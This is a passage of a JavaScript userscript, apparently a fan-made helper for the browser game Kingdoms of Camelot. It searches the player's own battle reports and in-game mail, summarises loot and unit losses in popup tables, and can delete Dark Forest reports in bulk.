			t.DisplayRpt();
	},

	handleRptWhat: function(){
		var t = Tabs.Reports;
		t.what = document.getElementById("idRptWhat").value;
		if (t.data.length > 0)
			if (Options.rptType == 'alliance' || Options.rptType == 'player')
				t.DisplayRpt();
			else
				t.DisplayMail();
	},

	handleRptWhatNot: function(){
		var t = Tabs.Reports;
		t.whatNot = document.getElementById("idRptWhatNot").value;
		if (t.data.length > 0)
			if (Options.rptType == 'alliance' || Options.rptType == 'player')
				t.DisplayRpt();
			else
				t.DisplayMail();
	},

	handleRptSearch: function(){
		var t = Tabs.Reports;
		if (t.searchRunning){
			t.searchRunning = false;
			t.stopSearch ('RECHERCHE ANNULEE !');
			return;
		}
		t.handleRptPages();
		document.getElementById ('idRptSearch').value = ''+culang.stopping+'';
		document.getElementById('idRptStatus').innerHTML = ''+culang.Hsearching+' ' + t.minPages + ' '+culang.Hfrom+'  ' + t.maxPages +' '+culang.Hpages;
		t.searchRunning = true;
		t.data=[];
		t.report = [];
		t.dataDF=[];
		t.dataAT=[];
		t.reportAT=[];
		t.reportDF = [];
		if (Options.rptType == 'alliance' || Options.rptType == 'player')
			t.getRpt(t.minPages);
		else
			t.getMail(t.minPages);
	},

	
	stopSearch: function (msg){
		var t = Tabs.Reports;
		if (t.searchRunning || msg == ''+culang.cancelsearch+'')
			document.getElementById ('idRptStatus').innerHTML = '<FONT color=#ffaaaa>' + msg + '</FONT>';
		document.getElementById ('idRptSearch').value = ''+culang.search+'';
		t.searchRunning = false;
		if (Options.rptType == 'alliance' || Options.rptType == 'player')
			t.DisplayRpt();
		else
			t.DisplayMail();
	},

	getMail: function (pageNum){
		var t = Tabs.Reports;
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.pf=0;
		params.requestType="GET_MESSAGE_HEADERS_FOR_USER_INBOX";
		params.boxType = document.getElementById('idRptType').value;
		params.pageNo = pageNum;
		new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getEmail.php" + unsafeWindow.g_ajaxsuffix, {
			method: "post",
			parameters: params,
			onSuccess: function (rslt) {
				t.getMailCallback(rslt, pageNum);
			},
			onFailure: function () {
			},
		}, false);
	},

	getMailCallback: function(rslt, page) {
		var t = Tabs.Reports;
		if (rslt) {
			if (!rslt.ok) {
				document.getElementById("idRptStatus").innerHTML = '<FONT color=#ffaaaa>' + rslt.errorMsg + '</FONT>';
				return;
			}
			t.totalPages=parseInt(rslt.noOfPages);
			if (t.totalPages < t.maxPages)
				t.maxPages = t.totalPages;
			if (rslt.message && page) {
				var ml = rslt.message;
				if (rslt.messageCount > 0) {
					var rptkeys = unsafeWindow.Object.keys(ml);
					for (var i = 0; i < rptkeys.length; i++) {
						var rpt = ml[rptkeys[i]];
						rpt.page = page;
						t.data.push(rpt);
					}
				}
			}
			if (parseInt(page)+1 <= t.maxPages && t.searchRunning) {
				document.getElementById("idRptStatus").innerHTML = ''+culang.Hsearching+' ' + (parseInt(page)+1) + ' '+culang.Hfrom+' ' + t.maxPages+' '+culang.Hpages;

				t.getMail(parseInt(page)+1);
				if (t.data.length > 0)
					t.DisplayMail();
			} else if (page)
				t.stopSearch (''+culang.Hdone+'');
		}
	},

	getRpt: function (pageNum){
		var t = Tabs.Reports;
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.pageNo = pageNum;
		if (Options.rptType == 'alliance')
			params.group = "a";
		new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/listReports.php" + unsafeWindow.g_ajaxsuffix, {
			method: "post",
			parameters: params,
			onSuccess: function (rslt){
				t.getRptCallback (rslt, pageNum);
			},
			onFailure: function (rslt){
				t.getRptCallback (rslt, pageNum);
			},
		}, false);
	},
	getRptCallback: function(rslt, page){
		var t = Tabs.Reports;
		if (rslt) {
			if (!rslt.ok) {
				document.getElementById("idRptStatus").innerHTML = '<FONT color=#ffaaaa>' + rslt.errorMsg + '</FONT>';
				return;
			}
			t.totalPages=parseInt(rslt.totalPages);
			if (t.totalPages < t.maxPages)
				t.maxPages = t.totalPages;
			if (rslt.arReports && page) {
				var ar = rslt.arReports;
				if (ar.length == 0)
					t.stopSearch(''+culang.Herror+' '+culang.Hon+' '+culang.Hpage+' ' + page + ' - '+culang.kabamg+'');
				var rptkeys = unsafeWindow.Object.keys(ar);
				for (var i = 0; i < rptkeys.length; i++) {
					var rpt = ar[rptkeys[i]];
					var reportId = parseInt(rpt.reportId);
					t.report[reportId] = [];
					t.report[reportId].side1Name = rslt.arPlayerNames['p'+rpt.side1PlayerId];
					t.report[reportId].side1AllianceId = parseInt(rpt.side1AllianceId);
					if (rpt.side1AllianceId > 0)
						t.report[reportId].side1AllianceName = rslt.arAllianceNames['a'+rpt.side1AllianceId];
					else
						t.report[reportId].side1AllianceName = '-';
					if (rpt.side1CityId > 0)
						t.report[reportId].side1CityName = rslt.arCityNames['c'+rpt.side1CityId];
					else
						t.report[reportId].side1CityName = '-';
					t.report[reportId].side1XCoord = rpt.side1XCoord;
					t.report[reportId].side1YCoord = rpt.side1YCoord;
					if (parseInt(rpt.side0PlayerId) == 0) { // Kabam
						t.report[reportId].side0Name = ''+culang.rptvic+'';
						t.report[reportId].side0AllianceName = '';
						t.report[reportId].side0CityName = '';
					} else {
						t.report[reportId].side0Name = rslt.arPlayerNames['p'+rpt.side0PlayerId];
						if (rpt.side0AllianceId > 0)
							t.report[reportId].side0AllianceName = rslt.arAllianceNames['a'+rpt.side0AllianceId];
						else
							t.report[reportId].side0AllianceName = '-';
						if (rpt.side0CityId > 0)
							t.report[reportId].side0CityName = rslt.arCityNames['c'+rpt.side0CityId];
						else
							t.report[reportId].side0CityName = '-';
					}
					t.report[reportId].side0AllianceId = parseInt(rpt.side0AllianceId);
					t.report[reportId].side0XCoord = rpt.side0XCoord;
					t.report[reportId].side0YCoord = rpt.side0YCoord;
					if (parseInt(rpt.side0TileType) == 10)
						t.report[reportId].side0TileTypeText=''+culang.rptgrass+'';
					else if (parseInt(rpt.side0TileType) == 11)
						t.report[reportId].side0TileTypeText=''+culang.rptlake+'';
					else if (parseInt(rpt.side0TileType) == 20)
						t.report[reportId].side0TileTypeText=''+culang.rptforest+'';
					else if (parseInt(rpt.side0TileType) == 30)
						t.report[reportId].side0TileTypeText=''+culang.rpthill+'';
					else if (parseInt(rpt.side0TileType) == 40)
						t.report[reportId].side0TileTypeText=''+culang.rptmount+'';
					else if (parseInt(rpt.side0TileType) == 50)
						t.report[reportId].side0TileTypeText=''+culang.rptplain+'';
					else if (parseInt(rpt.side0TileType) == 51 && parseInt(rpt.side0CityId) == 0)
						t.report[reportId].side0TileTypeText=''+culang.rptbarb+'';
					else if (parseInt(rpt.side0TileType) == 54)
						t.report[reportId].side0TileTypeText=''+culang.darkforest+'';
					else if (parseInt(rpt.side0CityId) == 0)
						t.report[reportId].side0TileTypeText=''+culang.rptbarb+'';
					else
						t.report[reportId].side0TileTypeText=''+culang.city+'';
								
					t.report[reportId].side0TileTypeLevel = t.report[reportId].side0TileTypeText + ' ' + rpt.side0TileLevel;
					t.report[reportId].side0TileType = rpt.side0TileType;
					t.report[reportId].side0TileLevel = rpt.side0TileLevel;
					t.report[reportId].page = page;
					t.report[reportId].reportUnixTime = rpt.reportUnixTime;
					if (rpt.side0AllianceId == parseInt(getMyAlliance()[0]))
						t.report[reportId].sideId = 0;
					else if (rpt.side1AllianceId == parseInt(getMyAlliance()[0])) {
						t.report[reportId].sideId = 1;
					} else { // if we're here then this is a player report from when they were in another alliance
						if (rpt.side0PlayerId == getMyUserId())
							t.report[reportId].sideId = 0;
						else if (rpt.side1PlayerId == getMyUserId())
							t.report[reportId].sideId = 1;
						else // shouldn't get here but we'll catch it if the report body is requested
							t.report[reportId].sideId = -1;
					}
					
					
										
					if (!document.getElementById("AttackSummary").checked && parseInt(rpt.side0TileType) == 54 && Options.rptType=='player') {
					    t.FindItemRpt(reportId, t.report[reportId].sideId, t.report[reportId].side0TileLevel);  
				        }
					if (document.getElementById("AttackSummary").checked && rpt.marchType == 4)	{
					    t.AttackSummary(reportId, t.report[reportId].sideId, 0);
					}
					
					if (rpt.marchType == 0)
						t.report[reportId].marchName = ''+culang.desert+'';
					else if (rpt.marchType == 1)
						t.report[reportId].marchName = ''+culang.transport+'';
					else if (rpt.marchType == 2)
						t.report[reportId].marchName = ''+culang.rptreinforce+'';
					else if (rpt.marchType == 3 || rpt.marchType == 11) {
						if (t.report[reportId].sideId == 0)
							t.report[reportId].marchName = ''+culang.ascout+'';
						else
							t.report[reportId].marchName = ''+culang.scout+'';
					} else if (rpt.marchType == 4) {
						if (t.report[reportId].sideId == 0)
							t.report[reportId].marchName = ''+culang.defense+'';
						else
							t.report[reportId].marchName = ''+culang.rptattack+'';
					} else if (rpt.marchType == 10 || rpt.marchType == 9) {
					 t.report[reportId].marchName = ''+culang.rptattack+'';
					} else
						t.report[reportId].marchName = '?';
					t.data.push ({
						reportId: reportId,
					});
				}
			}
			if (parseInt(page)+1 <= t.maxPages && t.searchRunning) {
				document.getElementById("idRptStatus").innerHTML = ''+culang.Hsearching+' ' + (parseInt(page)+1) + ' '+culang.Hfrom+' ' + t.maxPages+' '+culang.Hpages;
				t.getRpt(parseInt(page)+1);
				if (t.data.length > 0)
					t.DisplayRpt();
			} else if (page) {
				
				if (document.getElementById("AttackSummary").checked) {
				 t.stopSearch ('<a id=BOresumeAT style="color:#ffaaaa" onclick="javascript:void(0);"><u>'+culang.rptsummary+'</u></a>');
				 setTimeout(function() {					 
						document.getElementById("BOresumeAT").addEventListener ('click', t.AfficheResumeAtk, false);
				  }, 1000);
				} else {
				
				if (Options.rptType=='player') {
				 t.stopSearch ('<a id=BOresumeDF style="color:#ffaaaa" onclick="javascript:void(0);"><u>'+unsafeWindow.g_js_strings.commonstr.darkForest+'</u></a>');
				 setTimeout(function() {
				   document.getElementById("BOresumeDF").addEventListener ('click', t.AfficheResume, false);
				  }, 1000);
				 } else {
				  t.stopSearch (''+culang.Hdone+'');
				 }
				}
			}
		}
	},
	AfficheResumeAtk:function() {
	 var t = Tabs.Reports;
	 var puipui=new Array();
	 var fortmight = {u53: "4",u55: "7",u60: "1",u61: "2",u62: "3",    };
	 for (var ui = 1 ; ui<13; ui++)
		 puipui.push(unsafeWindow.unitmight['unt'+ui]);
		puipui[52] = fortmight['u53'];
		puipui[54] = fortmight['u55'];
		puipui[59] = fortmight['u60'];
		puipui[60] = fortmight['u61'];
		puipui[61] = fortmight['u62']; 
	 var messageBody="";
	 reportsSearched = t.dataAT.length;
	 reportsFound = 0;
         var tr0=0,tr1=0,tr2=0,tr3=0,tr4=0,tr5=0;
	 if (reportsSearched>0) {
	  messageBody +='<br><center><table width=95%><thead><th>'+culang.rptvic+' / '+culang.alliance+'</th><th><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/gold_30.png></th>\
	  <th><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/food_30.png></th><th><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/wood_30.png></th>\
	  <th><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/stone_30.png></th><th><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/iron_30.png></th>\
	  <th><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/aetherstone_30.png></th></thead><tbody>';
	  t.dataAT.sort(function(a, b){
		var sortA=a.nom,sortB=b.nom;
		if (sortA < sortB) return -1
		if (sortA > sortB) return 1
		return 0 
	  });
	 var datartp = [];
	 var nbrp=0;
	 for (var i=0; i<reportsSearched;i++) {
	  var idrapport=t.dataAT[i].reportId;
	  if (t.what == '' || (t.dataAT[i].nom.search(t.what, "i") != -1)  || (t.dataAT[i].alliance.search(t.what, "i") != -1)) {
	   
	   if (datartp[nbrp]==undefined) { 
	     datartp[nbrp]=[];
	     datartp[nbrp].nom = t.dataAT[i].nom;
	     datartp[nbrp].alliance = t.dataAT[i].alliance;
	     datartp[nbrp].res0=0;
	     datartp[nbrp].res1=0;
	     datartp[nbrp].res2=0;
	     datartp[nbrp].res3=0;
	     datartp[nbrp].res4=0;
	     datartp[nbrp].res5=0;
	      for (var z=1;z<64;z++) {
	      datartp[nbrp]['s1unit'+z] =0;
	      datartp[nbrp]['s0unit'+z] =0;
	     }
	   }  
	   if(datartp[nbrp].nom==t.dataAT[i].nom && datartp[nbrp].alliance==t.dataAT[i].alliance) {
	     datartp[nbrp].res0 += parseIntNan(t.reportAT[idrapport].res0);
	     datartp[nbrp].res1 += parseIntNan(t.reportAT[idrapport].res1);
	     datartp[nbrp].res2 += parseIntNan(t.reportAT[idrapport].res2);
	     datartp[nbrp].res3 += parseIntNan(t.reportAT[idrapport].res3);
	     datartp[nbrp].res4 += parseIntNan(t.reportAT[idrapport].res4);
	     datartp[nbrp].res5 += parseIntNan(t.reportAT[idrapport].res5);
	       for (var z=1;z<64;z++) {
	        datartp[nbrp]['s1unit'+z] += parseIntNan(t.reportAT[idrapport]['s1unit'+z]);
	        datartp[nbrp]['s0unit'+z] += parseIntNan(t.reportAT[idrapport]['s0unit'+z]);
	        
	       }
	   } else {
	     nbrp++;
	     datartp[nbrp]=[];
	     datartp[nbrp].nom = t.dataAT[i].nom;
	     datartp[nbrp].alliance = t.dataAT[i].alliance;
	     datartp[nbrp].res0=0;
	     datartp[nbrp].res1=0;
	     datartp[nbrp].res2=0;
	     datartp[nbrp].res3=0;
	     datartp[nbrp].res4=0;
	     datartp[nbrp].res5=0;
	     datartp[nbrp].res0 += parseIntNan(t.reportAT[idrapport].res0);
	     datartp[nbrp].res1 += parseIntNan(t.reportAT[idrapport].res1);
	     datartp[nbrp].res2 += parseIntNan(t.reportAT[idrapport].res2);
	     datartp[nbrp].res3 += parseIntNan(t.reportAT[idrapport].res3);
	     datartp[nbrp].res4 += parseIntNan(t.reportAT[idrapport].res4);
	     datartp[nbrp].res5 += parseIntNan(t.reportAT[idrapport].res5);
	     for (var z=1;z<64;z++) {
	     	      datartp[nbrp]['s1unit'+z] =0;
	     	      datartp[nbrp]['s0unit'+z] =0;
	     	      datartp[nbrp]['s1unit'+z] += parseIntNan(t.reportAT[idrapport]['s1unit'+z]);
	     	      datartp[nbrp]['s0unit'+z] += parseIntNan(t.reportAT[idrapport]['s0unit'+z]);
	     }
	   }
	   
	   }// fin du regrouppement
	  }
reportsSearched = datartp.length;
	  var tres=[0,0,0,0,0,0];
	  var perts1=[];var perts0=[];
	  for (var z=1;z<64;z++) { perts1[z]=0;perts0[z]=0; }
	  
	  for (var i=0; i<reportsSearched;i++) {
	   messageBody += '<tr><td>'+datartp[i].nom+'<br>'+datartp[i].alliance+'</td>';
	    for (var res=0;res<6;res++) {
	     messageBody += '</td><td align=right>';
	     var cb=0;
	     if (datartp[i]["res"+res] != undefined) {
	       cb=parseIntNan(datartp[i]["res"+res]);
	       tres[res]+=cb;
	     }
	     messageBody += addCommas(cb);
	    }
	    for (var z=1;z<64;z++) {
	     perts1[z]+=parseIntNan(datartp[i]['s1unit'+z]);
	     perts0[z]+=parseIntNan(datartp[i]['s0unit'+z]);
	    } 
	  }
	  messageBody += '</td></tr><tr><td><b>'+culang.Htotal+': </td>';
	  for (var res=0;res<6;res++) messageBody +='<td align=right><b>'+addCommas(tres[res])+'</b></td>';
	  messageBody += "</tr></table>";
	  messageBody += "<br><table><thead><th width=120><b>"+culang.yourLooses+"</b></th>";
	  for (var z=1;z<64;z++) {
	    if (perts1[z]>0) {
	      messageBody +='<th width=6%><img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_'+z+'_30.jpg ';
	      if(z<14)
	        messageBody +='title="'+unsafeWindow.unitcost['unt'+z][0]+'"';
	      messageBody +='></th>';
	    }
	  }
	  messageBody +='<th></th></thead><tr><td>'+culang.units+'</td>';
	  for (var z=1;z<64;z++) if (perts1[z]>0) messageBody +='<td align=right>'+ addCommas(perts1[z])+'</td>';
	  messageBody +='<td></td></tr><tr><td>'+culang.might+'</td>';
	  for (var z=1;z<64;z++) if (perts1[z]>0) messageBody +='<td align=right>'+ addCommas(parseIntNan(perts1[z])*parseIntNan(puipui[z-1]))+'</td>';
	  var to1=0;
	  messageBody +='<td></td></tr><tr><td>'+culang.totalmight+'</td>';
	  for (var z=1;z<64;z++) to1+=(parseIntNan(perts1[z])*parseIntNan(puipui[z-1]));
	  messageBody += "<td align=right><b>"+addCommas(to1)+"</b></td></tr><thead><th><b>"+culang.theirLooses+"</b></th>";
	  for (var z=1;z<64;z++) {
	   if (perts0[z]>0) {
	      messageBody +='<th width=6%><img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_'+z+'_30.jpg ';
	      if(z<14)
	        messageBody +='title="'+unsafeWindow.unitcost['unt'+z][0]+'"';
	      messageBody +='></th>';
	   }
	  }
	  messageBody +='<th></th></thead><tr><td>'+culang.units+'</td>';
	  for (var z=1;z<64;z++) if (perts0[z]>0)messageBody +='<td align=right>'+ addCommas(parseIntNan(perts0[z]))+'</td>';
	  messageBody +='<td></td></tr><tr><td>'+culang.might+'</td>';
	  
	  for (var z=1;z<64;z++) if (perts0[z]>0)messageBody +='<td align=right>'+ addCommas(parseIntNan(perts0[z])*parseIntNan(puipui[z-1]))+'</td>';
	  var to2=0;
	  messageBody +='</tr><tr><td>'+culang.totalmight+'</td>';
	  for (var z=1;z<64;z++) to2+= (parseIntNan(perts0[z])*parseIntNan(puipui[z-1]));
	  messageBody +="<td align=right><b>"+addCommas(to2)+"</b></td></tr></table><br>";

	  if (to1<to2)
	    messageBody += "<br><b>"+culang.mightdiff+": <font color=#449944>"+addCommas((to2-to1))+"</font><br>";
	  if (to1==to2)
	    messageBody += "<br><b>"+culang.nolooses+"<br>";  
	   if (to1>to2)
	    messageBody += "<br><b>"+culang.mightdiff+": <font color=#994444>"+addCommas((to1-to2))+"</font><br>";  
	    
	 } else {
	  messageBody +="<br><center><b>"+culang.nofound+"</b><br>";
	 }
	 t.popRapportAT = new CPopup('pbRapportATBody', 0, 0, 746, 100, true, function() {clearTimeout (1000);});
	 t.popRapportAT.centerMe (mainPop.getMainDiv());
	 var m = '<DIV style="max-height:750px; overflow-y:scroll">';
	 m+= messageBody + '</div>';
	 t.popRapportAT.getMainDiv().innerHTML = m;
	 t.popRapportAT.getTopDiv().innerHTML = '<DIV class=showBadged><center>'+culang.rptsummary+'</center></DIV>';
	 t.popRapportAT.show(true);
	},
	AfficheResume:function() {
	 var t = Tabs.Reports;
	 var messageBody="";
	 reportsSearched = t.dataDF.length;
	 reportsFound = 0;
	 if (t.dataDF.length>0) {
	messageBody +='<br><center><table width=60%><thead><th>'+culang.shrreport+'</th><th>'+culang.level+'</th><th colspan=2>'+culang.nofound+'</th></thead><tbody>';
	for (var i=0; i<reportsSearched;i++) {
	var idrapport=t.dataDF[i].reportId;
	var rpt =  t.reportDF[idrapport];
	messageBody += '<tr><td align=right><a onclick="getReport('+ idrapport+')">'+idrapport+'</A></td><td>'+rpt.lvl+'</td><td><img width=30 src=https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/' + rpt.item + '.jpg></td><td>'+unsafeWindow.ksoItems[rpt.item].name+'</td></tr>';
	}
	messageBody += "</tbody></table>";
	} else {
	messageBody +="<br><center>"+culang.nofound+"<br>";
	}
	
	messageBody +='<br><input type=button value="'+culang.delallDF+'" id=DelAllDF></center>';
	
	
	t.popRapportDF = new CPopup('pbRapportDFBody', 0, 0, 746, 100, true, function() {clearTimeout (1000);});
	t.popRapportDF.centerMe (mainPop.getMainDiv());

	var m = '<DIV style="max-height:750px; overflow:auto">';
	m+= messageBody + '</div>';
	t.popRapportDF.getMainDiv().innerHTML = m;
	t.popRapportDF.getTopDiv().innerHTML = '<DIV class=showBadged><center>'+unsafeWindow.g_js_strings.commonstr.darkForest+'</center></DIV>';
	t.popRapportDF.show(true);
	document.getElementById('DelAllDF').addEventListener ('click', t.DeleteRptDF, false);
					
	},
	pagesasup:0,
	DeleteRptDF:function() {
	 var t = Tabs.Reports;
	 t.pagesasup = 0;
	 t.fetchreport(0, t.checkreports);
	 t.popRapportDF.show(false);
	 t.popRapportDF.destroy();
	 t.popRapportDF = null;
	},
	 fetchreport : function(pageNo, callback){
		var t =  Tabs.Reports;
		 if (t.pagesasup>=t.maxPages) return;
			var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
			if(pageNo > 1)
				params.pageNo = pageNo;
			new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/listReports.php" + unsafeWindow.g_ajaxsuffix, {
				method: "post",
				parameters: params,
				onSuccess: function (rslt) {
				        t.pagesasup++;
					callback(rslt);
				},
					onFailure: function () {
					t.pagesasup++;
					callback();
				},
			});
	    },
		
	    checkreports : function(rslt){
			var t = Tabs.Reports;
			if(!rslt.ok){
				return;
			}
			if(rslt.arReports.length < 1){
				return;
			}
			var reports = rslt.arReports;
			var totalPages = rslt.totalPages;
			var deletes1 = new Array();
			for(k in reports){
					if(reports[k].side0TileType==54)
						deletes1.push(k.substr(2));
				
			}
			if(deletes1.length > 0 ){
				t.deleteCheckedReports(deletes1);
			} else {
				
				return;
			}
	    },
    	deleteCheckedReports : function(deletes1){
    		var t =  Tabs.Reports;
    		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    		params.s1rids = deletes1.join(",");
    		params.cityrids = '';
    		new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/deleteCheckedReports.php" + unsafeWindow.g_ajaxsuffix, {
    			method: "post",
    			parameters: params,
    			onSuccess: function (rslt) {
    				if(rslt.ok){
    					Seed.newReportCount = parseInt(Seed.newReportCount) - parseInt(deletes1.length);
    				}
    				t.fetchreport(0, t.checkreports);
    				t.DisplayRpt();
    			},
    			onFailure: function () {
    			},
    		});
    },
    AttackSummary:function(reportId, sideId, lvl) {
     var t = Tabs.Reports;
     var rpt = t.report[reportId];
     var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
     	  params.rid=reportId;
	  params.side=sideId;
     if (params.side > -1) {
     	   new AjaxRequest(unsafeWindow.g_ajaxpath+"ajax/fetchReport.php"+unsafeWindow.g_ajaxsuffix, {  method:"post",  parameters:params,
       
     	   onSuccess:function(msg){
     		var rslt = eval("(" + msg.responseText + ")");
     		t.dataAT.push ({reportId: reportId, nom:rpt.side0Name, alliance:rpt.side0AllianceName});
     		t.reportAT[reportId] = [];
     		t.reportAT[reportId].nom = rpt.side0Name;
     		t.reportAT[reportId].alliance = rpt.side0AllianceName;
     		t.reportAT[reportId].res0=0;
     		t.reportAT[reportId].res1=0;
     		t.reportAT[reportId].res2=0;
     		t.reportAT[reportId].res3=0;
     		t.reportAT[reportId].res4=0;
     		t.reportAT[reportId].res5=0;
     		if (rslt.loot) {
     		 if (rslt['loot'][0] !== undefined) t.reportAT[reportId].res0=rslt['loot'][0];
     		 if (rslt['loot'][1] !== undefined) t.reportAT[reportId].res1=rslt['loot'][1];
     		 if (rslt['loot'][2] !== undefined) t.reportAT[reportId].res2=rslt['loot'][2];
     		 if (rslt['loot'][3] !== undefined) t.reportAT[reportId].res3=rslt['loot'][3];
     		 if (rslt['loot'][4] !== undefined) t.reportAT[reportId].res4=rslt['loot'][4];
     		 if (rslt['loot'][6] !== undefined) t.reportAT[reportId].res5=rslt['loot'][6];
     	        }
     	        if (sideId==0) { // les pertes !!!!
     	         for (var zz=0;zz<6;zz++)
     	            t.reportAT[reportId]["res"+zz] = t.reportAT[reportId]["res"+zz] *-1;
     	        }
     	        if (rslt['fght'] != undefined){
     	        	if (rslt['fght']["s1"] != undefined) {
     	        		for (var i=1;i<13;i++) {
					if (rslt['fght']["s1"]['u'+i] != undefined) {
						if (sideId==1) t.reportAT[reportId]['s1unit'+i]=rslt['fght']["s1"]['u'+i][0] - rslt['fght']["s1"]['u'+i][1]; // perte 
						else t.reportAT[reportId]['s0unit'+i]=rslt['fght']["s1"]['u'+i][0] - rslt['fght']["s1"]['u'+i][1]; // perte 

					}else{
					 	if (sideId==1) t.reportAT[reportId]['s1unit'+i]=0;
						else t.reportAT[reportId]['s0unit'+i]=0;
					}
				}
				for (var i=53;i<=55;i++) {
					if (rslt['fght']["s1"]['f'+i] != undefined) {
						if (sideId==1) t.reportAT[reportId]['s1unit'+i] = rslt['fght']["s1"]['f'+i][0] - rslt['fght']["s1"]['f'+i][1];
						else t.reportAT[reportId]['s0unit'+i] = rslt['fght']["s1"]['f'+i][0] - rslt['fght']["s1"]['f'+i][1];
				
			 		}else{
			 			if (sideId==1) t.reportAT[reportId]['s1unit'+i]=0;
			 			else t.reportAT[reportId]['s0unit'+i]=0;
					}
			 	}
		 		for (var i=60;i<=63;i++) {
					if (rslt['fght']["s1"]['f'+i] != undefined) {
						if (sideId==1) t.reportAT[reportId]['s1unit'+i] = rslt['fght']["s1"]['f'+i][0] - rslt['fght']["s1"]['f'+i][1];
						else t.reportAT[reportId]['s0unit'+i] = rslt['fght']["s1"]['f'+i][0] - rslt['fght']["s1"]['f'+i][1];
				
					}else{
			 			if (sideId==1) t.reportAT[reportId]['s1unit'+i]=0;
			 			else t.reportAT[reportId]['s0unit'+i]=0;
					}
			 	}	
		 	}
     	         	if (rslt['fght']["s0"] != undefined) {
     	         		for (var i=1;i<13;i++) {
					if (rslt['fght']["s0"]['u'+i] != undefined) {
					  if (sideId==1) {
					   t.reportAT[reportId]['s0unit'+i]=rslt['fght']["s0"]['u'+i][0] - rslt['fght']["s0"]['u'+i][1]; // perte
					  }else{
					    t.reportAT[reportId]['s1unit'+i]=rslt['fght']["s0"]['u'+i][0] - rslt['fght']["s0"]['u'+i][1]; // perte
					  }
					} else {
					 if (sideId==1) {
					  t.reportAT[reportId]['s0unit'+i]=0;
					 } else {
					   t.reportAT[reportId]['s1unit'+i]=0;
					 }
					}
				}
     	         		for (var i=53;i<=55;i++) {
		 			if (rslt['fght']["s0"]['f'+i] != undefined) {
		 				if (sideId==1) {
		 					t.reportAT[reportId]['s1unit'+i] = rslt['fght']["s0"]['f'+i][0] - rslt['fght']["s0"]['f'+i][1];
		 				} else {
		 					t.reportAT[reportId]['s0unit'+i] = rslt['fght']["s0"]['f'+i][0] - rslt['fght']["s0"]['f'+i][1];
		 				}
		 			}else{
						if (sideId==1) t.reportAT[reportId]['s1unit'+i]=0;
						else t.reportAT[reportId]['s0unit'+i]=0;
					}
			 	}
		 		for (var i=60;i<=63;i++) {
		 			if (rslt['fght']["s0"]['f'+i] != undefined) {
		 				if (sideId==1) {
		 					t.reportAT[reportId]['s1unit'+i] = rslt['fght']["s0"]['f'+i][0] - rslt['fght']["s0"]['f'+i][1];
		 				} else {
		 					t.reportAT[reportId]['s0unit'+i] = rslt['fght']["s0"]['f'+i][0] - rslt['fght']["s0"]['f'+i][1];
		 				}
		 			}else{
			 			if (sideId==1) {
			 					t.reportAT[reportId]['s1unit'+i]=0;
			 				} else {
			 					t.reportAT[reportId]['s0unit'+i]=0;
						}
			 		}	
		 		}
			}
     	        }
     	        
        } });
      }  
    },
    
	FindItemRpt:function(reportId, sideId, lvl) {
	  var t = Tabs.Reports;
	  var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
	  params.rid=reportId;
	  params.side=sideId;
	  if (params.side > -1) {
	   new AjaxRequest(unsafeWindow.g_ajaxpath+"ajax/fetchReport.php"+unsafeWindow.g_ajaxsuffix, {  method:"post",  parameters:params,
  
	   onSuccess:function(msg){
		var rslt = eval("(" + msg.responseText + ")");
		if (rslt.loot) {
			if (rslt['loot'][5] !== undefined) {
				var q=unsafeWindow.Object.keys(rslt['loot'][5]);
				if (q.length>0) {
			 			  for(var u=0,y=q.length;u<y;++u){
			 				C=q[u];
			 				if (unsafeWindow.ksoItems[C]!==undefined) {
			 				 t.dataDF.push ({reportId: reportId,});
			 				 t.reportDF[reportId] = [];
			 				 t.reportDF[reportId].lvl = lvl;
			 				 t.reportDF[reportId].item = C;
			 				}
			 			  }
			 	}
			
	          
	                    }
	          
	               }
	        }
            });
          }  
	
	},
	DisplayMail: function (){
		var t = Tabs.Reports;
		var results = document.getElementById("ReportResultDiv");
		if(!t.data.length) {
			results.innerHTML = '<center>'+culang.noHits+'</center>';
			return;
		}
		reportsSearched = t.data.length;
		reportsFound = 0;
		t.content = '';
		for (var i=0; i<reportsSearched;i++) {
			var rpt = t.data[i];
			if ((t.what == '' || (rpt.subject.search(t.what, "i") != -1) || (rpt.displayName.search(t.what, "i") != -1))
				&& (t.whatNot == '' || ((rpt.subject.search(t.whatNot, "i") == -1) && (rpt.displayName.search(t.whatNot, "i") == -1)))) {
				if (rpt.subject == '')
					rpt.subject = ''+culang.nosubject+'';
				reportsFound++;
				if (reportsFound == 1)
				t.content += '<center><table width=97%><thead><th>'+culang.shrp+'</th><th>'+culang.udate+'</th><th>'+culang.player+'</th><th>'+culang.subject+'</th><th>'+culang.shrdel+'</th></thead><tbody>';
				var stylee="";
				if (rpt.messageRead==0) stylee=' style="background-color:#CCCCCC;"';
				t.content += '<tr><td align=right '+stylee+'>'+rpt.page+'</td><td '+stylee+'>'+rpt.dateSent+'</td><td '+stylee+'>'+rpt.displayName+'</td>';
				t.content += '<td '+stylee+'><A><SPAN onclick="getmsg('+ rpt.messageId +')">' + rpt.subject + '</SPAN></a></td><td><a onclick="DelMail('+ rpt.messageId +');"><img src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 title="'+culang.delrep+'"></a></td></tr>';
			}
		}
		if (reportsFound > 1)
			t.content += '</tbody></table></center>';
		if (reportsFound == 0 && reportsSearched > 0)
			t.content = '<center>'+culang.noHits+'</center>';
		results.innerHTML = t.content;
